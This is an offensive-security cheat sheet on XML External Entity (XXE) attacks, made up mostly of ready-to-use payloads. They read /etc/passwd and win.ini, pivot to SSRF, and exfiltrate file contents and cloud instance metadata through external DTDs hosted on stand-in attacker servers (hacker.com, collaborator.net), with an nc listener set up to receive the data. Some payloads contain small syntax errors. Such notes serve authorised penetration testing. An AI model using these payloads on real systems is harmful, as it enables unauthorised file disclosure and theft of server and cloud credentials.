# XML External Entity (XXE)

* **Check**&#x20;
  * XML POST data
  * JSON POST data&#x20;
    * Burpsuite -> **Content Type Converter**&#x20;
* **New Entity Test**
  * Add `&toreplace` in any input XML tag
  * If 200, XXE possible

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<roottag>
    <productid>&toreplace</productid>
    <storeid>1</storeid>
</roottag>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace SYSTEM "/etc/passwd"> ]>
<roottag>
    <productid>&toreplace</productid>
    <storeid>1</storeid>
</roottag>
```

**XXE to SSRF**

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY> <!ENTITY % xxe SYSTEM "http://hacker.com/test"> ]>
<foo>&xxe;</foo>
```

**XXE Base64 Encoded**

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;]>
<foo/>
```

**Exfiltrate files from server**

* Launch nc on hacker server:
  * `nc -nlvp 1337`
* Save this on hacker's server in /var/www/html/ev.xml

```xml
<!ENTITY % data SYSTEM "d:\windows\win.ini">
<!ENTITY % param1 "<!Entity exfil SYSTEM 'http://hacker.com:1337/?%data;'>">
```

* XML Payload

```xml
<?xml version="1.0" ?>
<!DOCTYPE F [
<!ELEMENT F ANY>
<!ENTITY % sp SYSTEM "http://hacker.com/ev.xml">
%sp;
%param1;
]>
<F>&exfil;</>
```

**Polyglot - xxe.jpg**

* Payload in Image Metadata

```xml
<!DOCTYPE r [<!ELEMENT r ANY><!ENTITY % sp SYSTEM "http://hacker.com/ext.dtd">%sp;%param1;]><r>&exfil;</r>
```

* External dtd content

```xml
<!ENTITY % data SYSTEM "http://169.254.169.254/latest/meta-data/local-hostname">
<!ENTITY % param1 "<!Entity exfil SYSTEM 'http://collaborator.net/?%data;'>">
```

